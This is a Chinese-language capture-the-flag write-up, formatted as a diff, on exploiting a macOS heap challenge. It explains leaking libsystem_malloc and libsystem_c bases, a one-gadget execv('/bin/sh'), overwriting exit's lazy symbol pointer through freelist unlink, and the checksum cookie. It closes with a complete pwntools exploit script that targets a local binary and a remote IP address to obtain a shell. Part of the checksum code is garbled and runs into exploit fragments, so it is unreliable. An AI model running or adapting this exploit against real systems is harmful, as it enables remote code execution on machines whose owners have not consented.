@@ -1,0 +1,214 @@
+继续查看源代码
+    typedef struct malloc_introspection_t {
+        kern_return_t (* MALLOC_INTROSPECT_FN_PTR(enumerator))(task_t task, void *, unsigned type_mask, vm_address_t zone_address, memory_reader_t reader, vm_range_recorder_t recorder); /* enumerates all the malloc pointers in use */
+        size_t    (* MALLOC_INTROSPECT_FN_PTR(good_size))(malloc_zone_t *zone, size_t size);
+        ...
+    }
+用之前介绍过的堆资料，可以知道  
+所以DefaultZone->introspect->enumerator这里储存了enumerator对应的函数`szone_ptr_in_use_enumerator`的地址
+####  libsystem_malloc.dylib地址
+所以  
+libsystem_malloc.dylib的地址 = leak出的`szone_ptr_in_use_enumerator地址 -sznoe偏移量(0x0000000000013D68)`
+####  libsystem_c.dylib地址
+这里有个很有趣的现象，就是MacOS的PIE会保证程序每次运行时都会随机堆栈以及加载地址，但是引入的动态库地址不会产生变化，似乎只会在开机时变化。  
+所以可以看下vmmap，确定下libsystem_c.dylib与libsystem_malloc.dylib加载地址，得到偏移量。  
+`libsystem_c.dylib = libsystem_malloc.dylib - 偏移量(0x161000)`
+###  OneGadget RCE
+分析了libsystem_c.dylib,发现了与Linux libc中同样的execv(‘/bin/sh’)代码片段  
+`onegadget rce = libsystem_c.dylib + 0x0000000000025D94`
+###  劫持程序流 – 前置
+这里利用MachO的Lazy
+Bind机制，复写libsystem_c.dylib的la_symbol_ptr表中的函数存放地址（不写原程序的原因是无法leak原程序加载地址）  
+查看一周发现最优的选择为`exit_la_symbol_ptr`  
+我们可以在add()函数阶段输入不被认可的Size，可让程序执行exit()进而执行我们写入的地址。
+这里发现libsystem_c.dylib的TEXT和DATA
+region地址相差较大，不像原程序紧挨在一起，所以这里还需要再leak一次libsystem_c.dylibd的DATA region地址。
+####  libsystem_c.dylib DATA
+分析原程序时发现在`.got`内有个`FILE **__stdinp_ptr`  
+可以看到开头的_p指向了某块内存的地址，这样就可以利用这个来完成leak DATA地址,这里buffer与DATA起始地址的偏移量分析下就可以得到
+`libsystem_c_DATA = libsystem_c_stdinptr - 0x4110`
+    typedef    struct __sFILE {
+        unsigned char *_p;    /* current position in (some) buffer */
+        int    _r;        /* read space left for getc() */
+        int    _w;        /* write space left for putc() */
+        short    _flags;        /* flags, below; this FILE is free if 0 */
+        short    _file;        /* fileno, if Unix descriptor, else -1 */
+        struct    __sbuf _bf;    /* the buffer (at least 1 byte, if !NULL) */
+        int    _lbfsize;    /* 0 or -_bf._size, for inline putc */
+        /* operations */
+        void    *_cookie;    /* cookie passed to io functions */
+        int    (*_close)(void *);
+        int    (*_read) (void *, char *, int);
+        fpos_t    (*_seek) (void *, fpos_t, int);
+        int    (*_write)(void *, const char *, int);
+        /* separate buffer for long sequences of ungetc() */
+        struct    __sbuf _ub;    /* ungetc buffer */
+        struct __sFILEX *_extra; /* additions to FILE to not break ABI */
+        int    _ur;        /* saved _r when _r is counting ungetc data */
+        /* tricks to meet minimum requirements even when malloc() fails */
+        unsigned char _ubuf[3];    /* guarantee an ungetc() buffer */
+        unsigned char _nbuf[1];    /* guarantee a getc() buffer */
+        /* separate buffer for fgetln() when line crosses buffer boundary */
+        struct    __sbuf _lb;    /* buffer for fgetln() */
+        /* Unix stdio files get aligned to block boundaries on fseek() */
+        int    _blksize;    /* stat.st_blksize (may be != _bf._size) */
+        fpos_t    _offset;    /* current lseek offset (see WARNING) */
+    } FILE;
+###  劫持程序流 – 核心
+根据前面堆的申请介绍，我们可以构造一些tiny堆，让再次申请堆时保证从freelist上获取，然后完成tiny_malloc_from_free_list()，使内部的unlink操作完成`next->previous
+= ptr->previous`任意数据写任意地址的操作
+但是这里有个问题，就是在unlink前，会有个unchecksum的检查，因为程序每次运行时，都会对当前的zone生成随机的cookie，导致这里无法绕过去
+    next = free_list_unchecksum_ptr(rack, &ptr->next);
+    free_list_gen_checksum(uintptr_t ptr)
+    {
+        uint8_t chk;
+        chk = (unsigned char)(ptr >> 0);
+        chk += (unsigned char)(ptr >> 8);
+        chk += (unsigned char)(ptr >> 16);
+        chk += (unsigned char)(ptr >> 24);
+    #if __LP64__
+        chk += (unsigned char)(ptr >> 32);
+        chk += (unsigned char)(ptr >> 40);
+        chk += (unsigned char)(ptr >> 48);
+        chk += (unsigned char)(ptr >> 56);
+    #endif
+        return chk;
+    }
+    static MALLOC_INLINE uintptr_t  free_list_checksum_ptr(rack_t *rack, void *ptr)
+    {
+        uintptr_t p = (uintptr_t)ptr;
+        return (p >> NYBBLE) | ((free_list_gen_checksum(p ^ rack->cookie) & (uintptr_t)0xF) > 4) | int(checksum, 16)))`
+## getshell
+下面是完整的exp
+    #!/usr/bin/python2.7
+    # -*- coding: utf-8 -*-    
+    from pwn import *
+    #import monkeyhex
+    from binascii import *
+    import socket
+    import sys
+    def main(checksum, localFlag):
+        if localFlag == 1:
+            p = process('./applepie')
+        elif localFlag == 2:
+            p = remote('127.0.0.1', 10007)
+        elif localFlag == 3:
+            p = remote('111.186.63.147', 6666)
+        # context.log_level = 'debug'
+        context.terminal = ['tmux', 'split', '-h']
+        def add(style,shape,size,name):
+            p.recvuntil('Choice: ')
+            p.sendline('1')
+            p.recvuntil(':')
+            p.sendline(str(style))
+            p.recvuntil(':')
+            p.sendline(str(shape))
+            p.recvuntil(':')
+            p.sendline(str(size))
+            p.recvuntil(':')
+            p.sendline(name)
+        def show(id):
+            p.recvuntil('Choice:' )
+            p.sendline('2')
+            p.recvuntil(':')
+            p.sendline(str(id))
+        def update(id,style,shape,size,name):
+            p.recvuntil('Choice: ')
+            p.sendline('3')
+            p.recvuntil(':')
+            p.sendline(str(id))
+            p.recvuntil(':')
+            p.sendline(str(style))
+            p.recvuntil(':')
+            p.sendline(str(shape))
+            p.recvuntil('Size: ')
+            p.sendline(str(size))
+            p.recvuntil(':')
+            p.sendline(name)
+        def free(id):
+            p.recvuntil('Choice:')
+            p.sendline('4')
+            p.recvuntil(':')
+            p.sendline(str(id))
+        id0 = add(1, 1, 0x40, 'aaa')
+        id1 = add(1, 1, 0x40, 'aaa')
+        # 溢出修改styleTable数组的index，完成leak Default Zone struct的introspect保存的enumerator，可以用来leak libsystem_malloc.dylib
+        # libsystem_malloc.dylib`szone_ptr_in_use_enumerator:
+        #     0x7fff68161d68 :  push   rbp
+        #     0x7fff68161d69 :  mov    rbp, rsp
+        update(0, 1, 1, 0x50, 'a'*0x40 + p64(0x3fc0/8))
+        show(1)
+        p.recvuntil('Style: ')
+        szone_ptr_in_use_enumerator = u64(p.recvuntil('n')[:-1].ljust(8, 'x00'))
+        log.info_once('szone_ptr_in_use_enumerator = ' + hex(szone_ptr_in_use_enumerator))
+        # szone_ptr_in_use_enumerator函数在libsystem_malloc.dylib中的地址0x0000000000013D68 
+        libsystem_malloc_baseImage = szone_ptr_in_use_enumerator - 0x0000000000013D68
+        # Mac PIE的特殊性，程序本身每次运行全随机化，但动态库只有在开机时才会随机一次，此后位置都为固定
+        libsystem_c_baseImage = libsystem_malloc_baseImage - 0x161000
+        onegadget_rce = libsystem_c_baseImage + 0x0000000000025D94
+    #    libsystem_c_exit_la_symbol_ptr = libsystem_c_baseImage + 0x8a0b0
+        log.info_once('libsystem_malloc.dylib = ' + hex(libsystem_malloc_baseImage))
+        log.info_once('libsystem_c.dylib = ' + hex(libsystem_c_baseImage))
+        log.info_once('libsystem_c.dylib: onegadget rce = ' + hex(onegadget_rce))
+    #    log.info('libsystem_c.dylib: exit->la_symbol_ptr = ' + hex(libsystem_c_exit_la_symbol_ptr))
+    #   发现libsyste_c.dylib等动态库DATA与TEXT段分离较远（vmmap）,所以先leak libsystem_c.dylib的DATA段
+        update(0, 1, 1, 0x50, 'a'*0x40 + p64(0xffffffffffffff78/8))
+        show(1)
+        p.recvuntil('Style: ')
+        libsystem_c_stdinptr = u64(p.recvuntil('n')[:-1].ljust(8, 'x00'))
+        log.info_once('FILE *stdinp->p: ' + hex(libsystem_c_stdinptr))
+        libsystem_c_DATA = libsystem_c_stdinptr - 0x4110
+        log.info_once('libsystem_c.dylib: DATA seg = ' + hex(libsystem_c_DATA))
+        libsystem_c_exit_la_symbol_ptr = libsystem_c_DATA + 0xb0
+        log.info_once('libsystem_c.dylib: exit->la_symbol_ptr = ' + hex(libsystem_c_exit_la_symbol_ptr))
+        # 接着步骤为
+        id2 = add(1, 1, 0x40, 'aaa')
+        id3 = add(1, 1, 0x40, 'aaa') # free
+        id4 = add(1, 1, 0x40, 'aaa') # -----> 更改这个堆，溢出修改到下一个free块id5
+        id5 = add(1, 1, 0x40, 'aaa') # free
+        id6 = add(1, 1, 0x40, 'aaa')
+        id7 = add(1, 1, 0x40, 'aaa') # free
+        id8 = add(1, 1, 0x40, 'aaa')
+        # 释放id3,将其挂在freelist上
+        free(3)
+        free(5)
+        free(7)
+        # 更新块id2时，溢出修改前面释放的id3块上的元数据头
+        # -----------------------------        # prev_pointer | next_pointer
+        # size         | ...
+        # ...
+        #              | size
+        # -----------------------------        # 
+        # 然后下次malloc时，会从freelist上获取之前free的id3
+        value = p64(((libsystem_c_exit_la_symbol_ptr >> 4) | int(checksum, 16)))
+        log.info_once('after checksum(ptr): ' + hex(u64(value)))
+        id7 = add(1, 1, 0x40, 'aaa')
+        update(4, 1, 1, 0x50, 'a'*0x40 + p64(onegadget_rce) + value)
+        # malloc申请内存，完成unlink操作, 将onegadget_rce写入libsystem_c_exit_la_symbol_ptr
+        p.recvuntil('Choice: ')
+        p.recvuntil('Choice: ')
+        p.sendline('1') # add
+        try:
+            res = p.recv() # recvice 'Error'
+            if res.find('malloc') > 0:
+                log.failure('error checksum: ' + res)
+                return
+            else:
+                log.success('!!! currect checksum(' + hex(libsystem_c_exit_la_symbol_ptr) + '): ' + hex(u64(value)))
+            p.sendline('1') # Style
+            p.recvuntil('Choice: ')
+            p.sendline('1') # Shape
+            p.recvuntil('Size: ')
+            p.sendline('9999') # 输入错误Size让程序去执行exit()流程
+            p.recv() # 'Error'
+            p.sendline('uname')
+            res = p.recvuntil('Darwin')
+            log.info(res)
+        except:
+            return
+        p.interactive() # 这里getshell后就可以退出了
+        if res.find('Darwin') >= 0:
+            sys.exit()
+    for i in range(0x00, 0x23):
+        checksum = '0x'+'{:016x}'.format(0x23<<56)
+        main(checksum, 1)
